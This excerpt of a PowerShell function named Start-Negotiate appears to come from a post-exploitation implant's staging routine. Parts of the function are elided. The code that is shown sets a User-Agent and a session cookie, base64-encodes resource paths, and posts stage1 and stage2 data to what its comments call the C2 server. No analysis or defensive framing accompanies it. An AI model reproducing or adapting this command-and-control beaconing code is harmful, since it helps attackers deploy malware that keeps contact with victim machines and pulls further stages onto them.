function Start-Negotiate{
    ...
    # the UserAgent always resets for multiple calls...silly
    $wc.Headers.Add("User-Agent",$UA);

    # add in the session ID cookie
    $wc.Headers.Add("Cookie","SESSIONID=$ID");

    # base64 encode the stage1
    $enc=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($s+"&index.jsp"));

    # actually post the data to the C2 server
    $raw=$wc.UploadData($s+"?"+$enc,"POST",$eb);
    ...
    # base64 encode the stage2 resource
    $enc=[System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($s+"&index.php"));

    # the User-Agent always resets for multiple calls...silly
    $wc.Headers.Add("User-Agent",$UA);

    # post the data back to the C2 server
    $raw=$wc.UploadData($s+"?"+$enc,"POST",$eb2);
